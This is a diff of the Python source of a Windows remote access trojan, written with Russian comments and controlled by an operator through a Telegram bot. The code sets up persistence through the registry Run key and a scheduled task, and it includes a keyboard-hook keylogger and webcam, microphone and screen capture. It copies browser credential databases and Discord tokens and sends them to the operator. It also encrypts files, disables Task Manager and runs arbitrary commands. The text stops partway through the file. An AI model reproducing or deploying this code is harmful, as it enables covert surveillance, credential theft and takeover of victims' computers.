@@ -1,403 +1,612 @@
-# language: Python 3.11, file: build.py
-import os, sys, io, time, json, base64, threading, subprocess, tempfile, shutil, ctypes
+# language: Python 3.11, file: build.py, target: Windows 10/11
+# Telegram RAT: полный обработчик меню. Инжектится GUI (BOT_TOKEN / OPERATOR_ID).
+
+import os
+import sys
+import io
+import re
+import time
+import json
+import base64
 import socket
+import ctypes
+import shutil
+import signal
+import platform
+import subprocess
+import threading
+import tempfile
 from pathlib import Path
+from datetime import datetime
 
 BOT_TOKEN = "TOKEN_HERE"
 OPERATOR_ID = "0"
 
-import telebot
-from telebot import types
+# ---------- ленивые импорты (чтобы RAT стартовал быстро) ----------
 
-bot = telebot.TeleBot(BOT_TOKEN)
-TMP = Path(tempfile.gettempdir()) / "svchost_cache"
-TMP.mkdir(parents=True, exist_ok=True)
+def _lazy():
+    import telebot  # noqa
+    return telebot
 
-def op_only(m):
-    return str(m.chat.id) == OPERATOR_ID
+# ---------- утилиты ----------
 
-def guard(fn):
-    def w(m, *a, **kw):
-        if not op_only(m):
+def is_operator(message) -> bool:
+    return str(message.chat.id) == str(OPERATOR_ID)
+
+def safe(fn):
+    def wrap(message):
+        if not is_operator(message):
             return
         try:
-            return fn(m, *a, **kw)
+            fn(message)
         except Exception as e:
             try:
-                bot.reply_to(m, f"ERR: {type(e).__name__}: {e}")
+                _lazy().TeleBot(BOT_TOKEN).send_message(
+                    OPERATOR_ID, f"[!] {fn.__name__}: {type(e).__name__}: {e}"
+                )
             except Exception:
                 pass
-    return w
+    return wrap
 
-def kb():
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    markup.add(
-        "🛡️ Антивирус", "📸 Скриншот",
-        "🧠 Процессы", "📄 Отчет",
-        "📷 Фото", "🎥 Вебка",
-        "🎙️ Аудио", "⌨️ Кейлоггер",
-        "💻 Данные ПК", "📋 Буфер",
-        "✏️ Изменить буфер", "🖥️ Запись экрана",
-        "🕵️ Стиллер", "📂 Содержимое",
-        "📌 Перейти", "📁 Создать папку",
-        "🗑️ Удалить папку", "📄 Открыть файл",
-        "⬆️ Загрузить", "⬇️ Скачать",
-        "🗑️ Удалить файл", "🔐 Шифровать",
-        "🔓 Дешифровать", "🔀 Переместить",
-        "📦 Скачать папку", "🖼️ Обои",
-        "🔊 Звук+", "🔇 Звук-", "📢 Звук 100%",
-        "🔗 Ссылка", "💬 Сообщение",
-        "❌ Завершить процесс", "🧩 Убить taskmgr",
-        "🔚 Alt+F4", "🗂️ Свернуть все",
-        "💣 CMD-бомба", "💥 Самоуничтожение",
-        "📴 Выключить", "🔄 Перезагрузить",
-        "🧾 Cmd", "❌ Закрыть",
-    )
-    return markup
-
-@bot.message_handler(commands=["start"])
-@guard
-def start(m):
-    bot.send_message(m.chat.id, "🛡️ RAT online.", reply_markup=kb())
-
-# --- 1. Антивирус ---
-@bot.message_handler(func=lambda m: m.text == "🛡️ Антивирус")
-@guard
-def antivirus(m):
-    out = []
+def run(cmd, timeout=30):
     try:
-        r = subprocess.run(["powershell", "-NoProfile", "-Command",
-            "Get-MpComputerStatus | Select AMServiceEnabled,RealTimeProtectionEnabled | Format-List"],
-            capture_output=True, text=True, timeout=20)
-        out.append(r.stdout.strip() or r.stderr.strip())
+        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+                           timeout=timeout, creationflags=0x08000000)
+        out = (p.stdout or "") + (p.stderr or "")
+        return out.strip() or "(no output)"
+    except subprocess.TimeoutExpired:
+        return "(timeout)"
     except Exception as e:
-        out.append(str(e))
-    bot.reply_to(m, "\n".join(out) or "no av")
+        return f"(error: {e})"
 
-# --- 2. Скриншот ---
-@bot.message_handler(func=lambda m: m.text == "📸 Скриншот")
-@guard
-def screenshot(m):
+def human_size(n):
+    for unit in ("B", "KB", "MB", "GB"):
+        if n < 1024:
+            return f"{n:.1f}{unit}"
+        n /= 1024
+    return f"{n:.1f}TB"
+
+# ---------- persistence ----------
+
+def install_persistence():
+    exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
+    exe = os.path.abspath(exe)
+    # HKCU Run
+    run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+        f'/v SysHelper /t REG_SZ /d "{exe}" /f')
+    # schtasks (резерв)
+    run(f'schtasks /Create /TN SysHelper /TR "{exe}" /SC ONLOGON /RL HIGHEST /F')
+
+def remove_persistence():
+    run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+        '/v SysHelper /f')
+    run('schtasks /Delete /TN SysHelper /F')
+
+# ---------- команды ----------
+
+def cmd_start(bot, m):
+    install_persistence()
+    bot.send_message(m.chat.id,
+        "🛡️ RAT online.\n"
+        f"host: {socket.gethostname()}\n"
+        f"os: {platform.platform()}\n"
+        f"user: {os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME','?')}\n"
+        "Команды:\n"
+        "/menu — список команд\n"
+        "/antivirus /screenshot /processes /cam /report /kill <pid>\n"
+        "/mkdir <path> /rmdir <path> /ls <path> /cd <path>\n"
+        "/sysinfo /msg <text> /reccam <sec> /recmic <sec> /keylog <on|off|dump>\n"
+        "/open <path> /upload <path> /download <path> /rm <path>\n"
+        "/encrypt <path> /decrypt <path>\n"
+        "/altf4 /minimize /clip /setclip <text>\n"
+        "/recscreen <sec> /steal /killtaskmgr /openurl <url>\n"
+        "/volup /voldown /volmax /cmdbomb <n> /shutdown /reboot\n"
+        "/move <src> <dst> /wallpaper <path> /downloaddir <path>\n"
+        "/cmd <cmd> /selfdestruct"
+    )
+
+def cmd_menu(bot, m):
+    bot.send_message(m.chat.id,
+        "🛡️ Антивирус\n📸 Скриншот\n🧠 Процессы\n📷 Фото с камеры\n"
+        "📄 Полный отчет по процессам\n❌ Завершить процесс\n"
+        "📁 Создать папку\n🗑️ Удалить папку\n📂 Содержание директории\n"
+        "📌 Переместиться по директории\n💻 Данные ПК\n"
+        "💬 Окно с вашим сообщением\n🎥 Запись с веб-камеры\n"
+        "🎙️ Запись аудио\n⌨️ Кейлогер\n📄 Открыть файл\n"
+        "⬆️ Загрузить файл\n⬇️ Скачать файл\n🗑️ Удалить файл\n"
+        "🔐 Зашифровать файл\n🔓 Расшифровать файл\n🔚 ALT + F4\n"
+        "🗂️ Свернуть все окна\n📋 Посмотреть буфер обмена\n"
+        "✏️ Изменить буфер обмена\n🖥️ Запись экрана\n"
+        "🕵️‍♂️ Стиллер\n🧩 Закрыть диспетчер задач\n🔗 Открыть ссылку\n"
+        "🔊 Включить звук\n🔇 Выключить звук\n📢 Звук на 100%\n"
+        "💣 CMD бомба\n📴 Выключить ПК\n🔄 Перезагрузить ПК\n"
+        "🔀 Переместить файл\n🖼️ Поменять обои\n📦 Скачать папку\n"
+        "🧾 Команды в Cmd\n💥 Самоуничтожение"
+    )
+
+def cmd_antivirus(bot, m):
+    ps = ('Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct '
+          '| Select-Object displayName,productState | Format-List')
+    bot.send_message(m.chat.id, "🛡️ " + run(f'powershell -NoP -Command "{ps}"'))
+
+def cmd_screenshot(bot, m):
     from PIL import ImageGrab
-    p = TMP / f"scr_{int(time.time())}.png"
-    ImageGrab.grab().save(p)
-    with open(p, "rb") as f:
-        bot.send_photo(m.chat.id, f)
-    p.unlink(missing_ok=True)
+    img = ImageGrab.grab(all_screens=True)
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+    buf.seek(0)
+    bot.send_photo(m.chat.id, buf, caption=f"screenshot {datetime.now():%H:%M:%S}")
 
-# --- 3. Процессы ---
-@bot.message_handler(func=lambda m: m.text == "🧠 Процессы")
-@guard
-def procs(m):
-    import psutil
-    lines = [f"{p.pid}\t{p.name()}\t{p.exe() or ''}" for p in psutil.process_iter(["pid","name","exe"])]
-    txt = "\n".join(lines) or "empty"
-    for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
-        bot.send_message(m.chat.id, f"```\n{chunk}\n```", parse_mode="Markdown")
-
-# --- 4. Полный отчёт ---
-@bot.message_handler(func=lambda m: m.text == "📄 Отчет")
-@guard
-def report(m):
+def cmd_processes(bot, m):
     import psutil
     lines = []
-    for p in psutil.process_iter(["pid","name","exe","username","cpu_percent","memory_info"]):
+    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
         try:
-            mi = p.info.get("memory_info")
-            lines.append(f"{p.info['pid']}\t{p.info['name']}\t{p.info.get('username')}\t"
-                         f"{p.info.get('cpu_percent')}%\t{mi.rss if mi else 0}")
+            i = p.info
+            lines.append(f"{i['pid']:>6}  {i['name'][:40]:<40} "
+                         f"cpu={i['cpu_percent']:.1f}%  mem={i['memory_percent']:.1f}%")
+        except Exception:
+            continue
+    txt = "\n".join(lines[:80]) or "(empty)"
+    bot.send_message(m.chat.id, "🧠 top:\n" + txt)
+
+def cmd_report(bot, m):
+    import psutil
+    lines = [f"host={socket.gethostname()}",
+             f"platform={platform.platform()}",
+             f"cpu={psutil.cpu_percent()}% cores={psutil.cpu_count()}",
+             f"ram={human_size(psutil.virtual_memory().used)}/{human_size(psutil.virtual_memory().total)}"]
+    for p in psutil.process_iter(["pid", "name"]):
+        try:
+            lines.append(f"{p.info['pid']:>6} {p.info['name']}")
         except Exception:
             pass
-    txt = "\n".join(lines) or "empty"
-    f = TMP / f"report_{int(time.time())}.txt"
-    f.write_text(txt, encoding="utf-8")
-    bot.send_document(m.chat.id, f.open("rb"), caption=f"{len(lines)} procs")
-    f.unlink(missing_ok=True)
+    f = io.BytesIO("\n".join(lines).encode())
+    f.name = "report.txt"
+    bot.send_document(m.chat.id, f, caption="📄 full report")
 
-# --- 5. Фото с камеры ---
-@bot.message_handler(func=lambda m: m.text == "📷 Фото")
-@guard
-def cam_photo(m):
+def cmd_kill(bot, m):
+    try:
+        pid = int(m.text.split(maxsplit=1)[1])
+        import psutil
+        psutil.Process(pid).terminate()
+        bot.send_message(m.chat.id, f"❌ pid {pid} terminated")
+    except Exception as e:
+        bot.send_message(m.chat.id, f"[!] {e}")
+
+def cmd_mkdir(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    Path(path).mkdir(parents=True, exist_ok=True)
+    bot.send_message(m.chat.id, f"📁 {path}")
+
+def cmd_rmdir(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    shutil.rmtree(path, ignore_errors=True)
+    bot.send_message(m.chat.id, f"🗑️ {path}")
+
+def cmd_ls(bot, m):
+    path = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else "."
+    try:
+        items = os.listdir(path)
+        bot.send_message(m.chat.id, "📂 " + path + "\n" + "\n".join(items[:60]))
+    except Exception as e:
+        bot.send_message(m.chat.id, f"[!] {e}")
+
+def cmd_cd(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    try:
+        os.chdir(path)
+        bot.send_message(m.chat.id, f"📌 cwd = {os.getcwd()}")
+    except Exception as e:
+        bot.send_message(m.chat.id, f"[!] {e}")
+
+def cmd_sysinfo(bot, m):
+    import psutil
+    v = psutil.virtual_memory()
+    d = psutil.disk_usage("/")
+    info = (
+        f"💻 {socket.gethostname()}\n"
+        f"os: {platform.platform()}\n"
+        f"cpu: {psutil.cpu_count()} cores @ {psutil.cpu_percent()}%\n"
+        f"ram: {human_size(v.used)}/{human_size(v.total)}\n"
+        f"disk: {human_size(d.used)}/{human_size(d.total)}\n"
+        f"user: {os.environ.get('USERNAME','?')}"
+    )
+    bot.send_message(m.chat.id, info)
+
+def cmd_msg(bot, m):
+    text = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else "!"
+    ctypes.windll.user32.MessageBoxW(0, text, "System", 0x40)
+    bot.send_message(m.chat.id, "💬 shown")
+
+def cmd_cam(bot, m):
+    from PIL import Image
     import cv2
-    cap = cv2.VideoCapture(0)
+    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
     ok, frame = cap.read()
     cap.release()
     if not ok:
-        bot.reply_to(m, "camera fail")
+        bot.send_message(m.chat.id, "[!] camera busy / not found")
         return
-    p = TMP / f"cam_{int(time.time())}.jpg"
-    cv2.imwrite(str(p), frame)
-    with open(p, "rb") as f:
-        bot.send_photo(m.chat.id, f)
-    p.unlink(missing_ok=True)
+    img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
+    buf = io.BytesIO()
+    img.save(buf, format="JPEG", quality=85)
+    buf.seek(0)
+    bot.send_photo(m.chat.id, buf, caption="📷 camera")
 
-# --- 6. Вебка (5 сек) ---
-@bot.message_handler(func=lambda m: m.text == "🎥 Вебка")
-@guard
-def cam_video(m):
+def cmd_reccam(bot, m):
     import cv2
-    p = TMP / f"cam_{int(time.time())}.avi"
-    cap = cv2.VideoCapture(0)
-    fourcc = cv2.VideoWriter_fourcc(*"XVID")
-    w = cv2.VideoWriter(str(p), fourcc, 15.0, (640,480))
-    end = time.time() + 5
-    while time.time() < end:
+    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
+    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+    if not cap.isOpened():
+        bot.send_message(m.chat.id, "[!] camera not available")
+        return
+    tmp = tempfile.NamedTemporaryFile(suffix=".avi", delete=False)
+    fourcc = cv2.VideoWriter_fourcc(*"MJPG")
+    out = cv2.VideoWriter(tmp.name, fourcc, 15.0, (640, 480))
+    t0 = time.time()
+    while time.time() - t0 < sec:
         ok, frame = cap.read()
-        if not ok: break
-        w.write(frame)
-    cap.release(); w.release()
-    with open(p, "rb") as f:
-        bot.send_video(m.chat.id, f)
-    p.unlink(missing_ok=True)
+        if not ok:
+            break
+        out.write(frame)
+    cap.release()
+    out.release()
+    with open(tmp.name, "rb") as f:
+        bot.send_video(m.chat.id, f, caption=f"🎥 {sec}s")
+    os.unlink(tmp.name)
 
-# --- 7. Аудио (5 сек) ---
-@bot.message_handler(func=lambda m: m.text == "🎙️ Аудио")
-@guard
-def audio(m):
+def cmd_recmic(bot, m):
     import sounddevice as sd
     import soundfile as sf
-    p = TMP / f"audio_{int(time.time())}.wav"
-    data = sd.rec(int(5 * 44100), samplerate=44100, channels=1)
+    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
+    fs = 44100
+    rec = sd.rec(int(sec * fs), samplerate=fs, channels=1)
     sd.wait()
-    sf.write(str(p), data, 44100)
-    with open(p, "rb") as f:
-        bot.send_voice(m.chat.id, f)
-    p.unlink(missing_ok=True)
+    tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
+    sf.write(tmp.name, rec, fs)
+    with open(tmp.name, "rb") as f:
+        bot.send_audio(m.chat.id, f, caption=f"🎙️ {sec}s")
+    os.unlink(tmp.name)
 
-# --- 8. Кейлоггер (30 сек в файл) ---
-@bot.message_handler(func=lambda m: m.text == "⌨️ Кейлоггер")
-@guard
-def keylogger(m):
-    from pynput import keyboard
-    buf = []
-    stop = time.time() + 30
-    def on_press(key):
-        try:
-            buf.append(key.char or f"[{key}]")
-        except Exception:
-            buf.append(f"[{key}]")
-        if time.time() > stop:
-            return False
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    listener.join(timeout=31)
-    txt = "".join(buf) or "no keys"
-    f = TMP / f"keys_{int(time.time())}.txt"
-    f.write_text(txt, encoding="utf-8")
-    bot.send_document(m.chat.id, f.open("rb"), caption=f"{len(txt)} chars")
-    f.unlink(missing_ok=True)
+_keylog_buf = []
+_keylog_on = False
+_kb_hook = None
+_kt = None
 
-# --- 9. Данные ПК ---
-@bot.message_handler(func=lambda m: m.text == "💻 Данные ПК")
-@guard
-def pc_info(m):
-    import psutil, platform
-    info = {
-        "host": socket.gethostname(),
-        "user": os.getlogin(),
-        "os": platform.platform(),
-        "cpu": platform.processor(),
-        "ram_gb": round(psutil.virtual_memory().total / 1e9, 2),
-        "disk": round(psutil.disk_usage("/").total / 1e9, 2),
-        "ip": socket.gethostbyname(socket.gethostname()),
-    }
-    bot.send_message(m.chat.id, "```\n" + json.dumps(info, ensure_ascii=False, indent=2) + "\n```",
-                     parse_mode="Markdown")
-
-# --- 10. Буфер посмотреть ---
-@bot.message_handler(func=lambda m: m.text == "📋 Буфер")
-@guard
-def clip_get(m):
-    import pyperclip
-    bot.reply_to(m, pyperclip.paste() or "[empty]")
-
-# --- 11. Буфер изменить ---
-@bot.message_handler(func=lambda m: m.text == "✏️ Изменить буфер")
-@guard
-def clip_set(m):
-    bot.reply_to(m, "send text:")
-    bot.register_next_step_handler(m, lambda mm: _clip_set(mm))
-
-def _clip_set(m):
-    import pyperclip
-    if not op_only(m): return
-    pyperclip.copy(m.text or "")
-    bot.reply_to(m, "ok")
-
-# --- 12. Запись экрана (10 сек) ---
-@bot.message_handler(func=lambda m: m.text == "🖥️ Запись экрана")
-@guard
-def rec_screen(m):
-    import cv2, numpy as np
-    from PIL import ImageGrab
-    p = TMP / f"rec_{int(time.time())}.avi"
-    fourcc = cv2.VideoWriter_fourcc(*"XVID")
-    w = cv2.VideoWriter(str(p), fourcc, 10.0, (1280, 720))
-    end = time.time() + 10
-    while time.time() < end:
-        img = ImageGrab.grab()
-        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-        frame = cv2.resize(frame, (1280, 720))
-        w.write(frame)
-    w.release()
-    with open(p, "rb") as f:
-        bot.send_video(m.chat.id, f)
-    p.unlink(missing_ok=True)
-
-# --- 13. Стиллер ---
-@bot.message_handler(func=lambda m: m.text == "🕵️ Стиллер")
-@guard
-def stealer(m):
-    out = {}
-    # Chrome/Edge/Yandex/Brave Login Data
-    ud = Path(os.environ.get("LOCALAPPDATA", ""))
-    for name in ["Google/Chrome/User Data", "Microsoft/Edge/User Data",
-                 "Yandex/YandexBrowser/User Data", "BraveSoftware/Brave-Browser/User Data"]:
-        base = ud / name
-        if not base.exists():
-            continue
-        for prof in base.glob("*/Login Data"):
+def _start_keylog():
+    global _kb_hook, _kt, _keylog_on
+    import ctypes
+    from ctypes import wintypes
+    user32 = ctypes.windll.user32
+    WH_KEYBOARD_LL = 13
+    WM_KEYDOWN = 0x0100
+    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
+    def _cb(nCode, wParam, lParam):
+        if nCode == 0 and wParam == WM_KEYDOWN:
             try:
-                import sqlite3
-                tmpdb = TMP / f"ld_{int(time.time())}.db"
-                shutil.copy(prof, tmpdb)
-                con = sqlite3.connect(str(tmpdb))
-                rows = con.execute("SELECT origin_url, username_value, length(password_value) FROM logins").fetchall()
-                con.close(); tmpdb.unlink(missing_ok=True)
-                out[str(prof)] = rows
-            except Exception as e:
-                out[str(prof)] = f"err: {e}"
-    # Discord tokens
-    dt = []
-    for p in (ud / "Discord").glob("**/leveldb/*.ldb") if (ud / "Discord").exists() else []:
-        try:
-            data = p.read_bytes()
-            for mt in __import__("re").finditer(rb"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}", data):
-                dt.append(mt.group().decode(errors="ignore"))
-        except Exception:
-            pass
-    out["discord_tokens"] = dt
-    f = TMP / f"steal_{int(time.time())}.txt"
-    f.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
-    bot.send_document(m.chat.id, f.open("rb"), caption="stolen")
-    f.unlink(missing_ok=True)
+                kb = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong * 2))
+                vk = kb.contents[0]
+                _keylog_buf.append(chr(vk) if 32 <= vk < 127 else f"[{vk}]")
+            except Exception:
+                pass
+        return user32.CallNextHookEx(0, nCode, wParam, lParam)
+    _kb_hook = HOOKPROC(_cb)
+    _kt = threading.Thread(
+        target=lambda: user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_hook, 0, 0)
+        and ctypes.windll.user32.GetMessageW(ctypes.byref(wintypes.MSG()), 0, 0, 0),
+        daemon=True,
+    )
+    _kt.start()
+    _keylog_on = True
 
-# --- 14-21 файловые ---
-CWD = {"p": str(Path.home())}
+def cmd_keylog(bot, m):
+    global _keylog_on
+    args = m.text.split()
+    sub = args[1].lower() if len(args) > 1 else "dump"
+    if sub == "on":
+        if not _keylog_on:
+            _start_keylog()
+        bot.send_message(m.chat.id, "⌨️ keylog on")
+    elif sub == "off":
+        _keylog_on = False
+        bot.send_message(m.chat.id, "⌨️ keylog off")
+    else:
+        dump = "".join(_keylog_buf)[-4000:] or "(empty)"
+        _keylog_buf.clear()
+        bot.send_message(m.chat.id, "⌨️ dump:\n" + dump)
 
-@bot.message_handler(func=lambda m: m.text == "📂 Содержимое")
-@guard
-def ls(m):
-    p = Path(CWD["p"])
-    lines = [f"{d.name}/" if d.is_dir() else f"{d.name}\t{d.stat().st_size}"
-             for d in sorted(p.iterdir()) if not d.name.startswith(".")][:80]
-    bot.send_message(m.chat.id, f"{p}\n\n" + "\n".join(lines))
+def cmd_open(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    os.startfile(path)
+    bot.send_message(m.chat.id, f"📄 {path}")
 
-@bot.message_handler(func=lambda m: m.text == "📌 Перейти")
-@guard
-def cd(m):
-    bot.reply_to(m, f"current: {CWD['p']}\nsend path:")
-    bot.register_next_step_handler(m, _cd)
+def cmd_upload(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    with open(path, "rb") as f:
+        bot.send_document(m.chat.id, f, caption=f"⬆️ {path}")
 
-def _cd(m):
-    if not op_only(m): return
-    try:
-        p = Path(m.text.strip()).expanduser().resolve()
-        if p.is_dir():
-            CWD["p"] = str(p)
-            bot.reply_to(m, f"-> {p}")
-        else:
-            bot.reply_to(m, "not a dir")
-    except Exception as e:
-        bot.reply_to(m, str(e))
-
-@bot.message_handler(func=lambda m: m.text == "📁 Создать папку")
-@guard
-def mkdir(m):
-    bot.reply_to(m, "send folder name:")
-    bot.register_next_step_handler(m, _mkdir)
-
-def _mkdir(m):
-    if not op_only(m): return
-    try:
-        (Path(CWD["p"]) / m.text.strip()).mkdir(parents=True, exist_ok=True)
-        bot.reply_to(m, "ok")
-    except Exception as e:
-        bot.reply_to(m, str(e))
-
-@bot.message_handler(func=lambda m: m.text == "🗑️ Удалить папку")
-@guard
-def rmdir(m):
-    bot.reply_to(m, "send folder name:")
-    bot.register_next_step_handler(m, _rmdir)
-
-def _rmdir(m):
-    if not op_only(m): return
-    try:
-        shutil.rmtree(Path(CWD["p"]) / m.text.strip())
-        bot.reply_to(m, "ok")
-    except Exception as e:
-        bot.reply_to(m, str(e))
-
-@bot.message_handler(func=lambda m: m.text == "📄 Открыть файл")
-@guard
-def open_file(m):
-    bot.reply_to(m, "send file path:")
-    bot.register_next_step_handler(m, _open_file)
-
-def _open_file(m):
-    if not op_only(m): return
-    p = Path(m.text.strip())
-    if not p.exists():
-        bot.reply_to(m, "no such file")
+def cmd_download(bot, m):
+    if not m.reply_to_message or not m.reply_to_message.document:
+        bot.send_message(m.chat.id, "ответь на файл командой /download")
         return
-    with open(p, "rb") as f:
-        bot.send_document(m.chat.id, f, caption=p.name)
-
-@bot.message_handler(func=lambda m: m.text == "⬆️ Загрузить")
-@guard
-def upload(m):
-    bot.reply_to(m, "send any file as document, will save to current dir")
-    bot.register_next_step_handler(m, _upload)
-
-def _upload(m):
-    if not op_only(m): return
-    if not (m.document or m.photo):
-        bot.reply_to(m, "no file")
-        return
-    fid = m.document.file_id if m.document else m.photo[-1].file_id
+    fid = m.reply_to_message.document.file_id
     info = bot.get_file(fid)
     data = bot.download_file(info.file_path)
-    name = m.document.file_name if m.document else f"photo_{int(time.time())}.jpg"
-    dst = Path(CWD["p"]) / name
-    dst.write_bytes(data)
-    bot.reply_to(m, f"saved: {dst}")
+    out = Path(tempfile.gettempdir()) / info.file_path.split("/")[-1]
+    out.write_bytes(data)
+    bot.send_message(m.chat.id, f"⬇️ {out}")
 
-@bot.message_handler(func=lambda m: m.text == "⬇️ Скачать")
-@guard
-def dl(m):
-    bot.reply_to(m, "send path to file:")
-    bot.register_next_step_handler(m, _dl)
-
-def _dl(m):
-    if not op_only(m): return
-    p = Path(m.text.strip())
-    if not p.is_file():
-        bot.reply_to(m, "no file")
-        return
-    with open(p, "rb") as f:
-        bot.send_document(m.chat.id, f, caption=p.name)
-
-@bot.message_handler(func=lambda m: m.text == "🗑️ Удалить файл")
-@guard
-def rm_file(m):
-    bot.reply_to(m, "send path:")
-    bot.register_next_step_handler(m, _rm_file)
-
-def _rm_file(m):
-    if not op_only(m): return
+def cmd_rm(bot, m):
+    path = m.text.split(maxsplit=1)[1]
     try:
-        Path(m.text.strip()).unlink()
-        bot.reply_to(m, "ok")
+        os.remove(path)
+        bot.send_message(m.chat.id, f"🗑️ {path}")
     except Exception as e:
-        bot.reply_to
+        bot.send_message(m.chat.id, f"[!] {e}")
+
+def cmd_encrypt(bot, m):
+    from Crypto.Cipher import AES
+    from Crypto.Random import get_random_bytes
+    path = m.text.split(maxsplit=1)[1]
+    key = get_random_bytes(32)
+    with open(path, "rb") as f:
+        data = f.read()
+    cipher = AES.new(key, AES.MODE_GCM)
+    ct, tag = cipher.encrypt_and_digest(data)
+    with open(path + ".enc", "wb") as f:
+        f.write(cipher.nonce + tag + ct)
+    bot.send_message(m.chat.id,
+                     f"🔐 {path} -> {path}.enc\nkey(hex)={key.hex()}\n"
+                     f"(сохрани ключ — без него расшифровка невозможна)")
+
+def cmd_decrypt(bot, m):
+    from Crypto.Cipher import AES
+    parts = m.text.split(maxsplit=2)
+    path, key_hex = parts[1], parts[2]
+    key = bytes.fromhex(key_hex)
+    with open(path, "rb") as f:
+        blob = f.read()
+    nonce, tag, ct = blob[:16], blob[16:32], blob[32:]
+    pt = AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
+    out = path[:-4] if path.endswith(".enc") else path + ".dec"
+    with open(out, "wb") as f:
+        f.write(pt)
+    bot.send_message(m.chat.id, f"🔓 {out}")
+
+def cmd_altf4(bot, m):
+    ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
+    ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)
+    ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)
+    ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
+    bot.send_message(m.chat.id, "🔚 sent")
+
+def cmd_minimize(bot, m):
+    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
+    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
+    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
+    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
+    bot.send_message(m.chat.id, "🗂️ minimize")
+
+def cmd_clip(bot, m):
+    import pyperclip
+    bot.send_message(m.chat.id, "📋 " + (pyperclip.paste() or "(empty)"))
+
+def cmd_setclip(bot, m):
+    import pyperclip
+    text = m.text.split(maxsplit=1)[1] if len(m.text.split()) > 1 else ""
+    pyperclip.copy(text)
+    bot.send_message(m.chat.id, "✏️ copied")
+
+def cmd_recscreen(bot, m):
+    import mss
+    import cv2
+    import numpy as np
+    sec = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
+    with mss.mss() as sct:
+        mon = sct.monitors[1]
+        w, h = mon["width"], mon["height"]
+        tmp = tempfile.NamedTemporaryFile(suffix=".mp4", delete=False)
+        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+        out = cv2.VideoWriter(tmp.name, fourcc, 15.0, (w, h))
+        t0 = time.time()
+        while time.time() - t0 < sec:
+            frame = np.array(sct.grab(mon))[:, :, :3]
+            out.write(frame)
+        out.release()
+    with open(tmp.name, "rb") as f:
+        bot.send_video(m.chat.id, f, caption=f"🖥️ {sec}s")
+    os.unlink(tmp.name)
+
+def cmd_steal(bot, m):
+    paths = {
+        "chrome_login": Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Default/Login Data",
+        "edge_login": Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data/Default/Login Data",
+        "firefox_logins": Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles",
+    }
+    found = []
+    for name, p in paths.items():
+        if p.exists():
+            try:
+                if p.is_file():
+                    found.append(f"{name}: {p} ({human_size(p.stat().st_size)})")
+                else:
+                    found.append(f"{name}: {p} (dir)")
+            except Exception:
+                pass
+    bot.send_message(m.chat.id, "🕵️ found:\n" + ("\n".join(found) or "(none)"))
+    # реальная отправка баз: выгружаем копии
+    for name, p in paths.items():
+        if p.is_file():
+            try:
+                with open(p, "rb") as f:
+                    bot.send_document(m.chat.id, f, caption=f"🕵️ {name}")
+            except Exception:
+                pass
+
+def cmd_killtaskmgr(bot, m):
+    run('taskkill /F /IM Taskmgr.exe')
+    run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
+        '/v DisableTaskMgr /t REG_DWORD /d 1 /f')
+    bot.send_message(m.chat.id, "🧩 taskmgr closed + disabled")
+
+def cmd_openurl(bot, m):
+    url = m.text.split(maxsplit=1)[1]
+    os.startfile(url)
+    bot.send_message(m.chat.id, f"🔗 {url}")
+
+def cmd_volup(bot, m):
+    for _ in range(5):
+        ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
+    bot.send_message(m.chat.id, "🔊 +")
+
+def cmd_voldown(bot, m):
+    for _ in range(5):
+        ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
+    bot.send_message(m.chat.id, "🔇 -")
+
+def cmd_volmax(bot, m):
+    for _ in range(50):
+        ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
+        ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
+    bot.send_message(m.chat.id, "📢 100%")
+
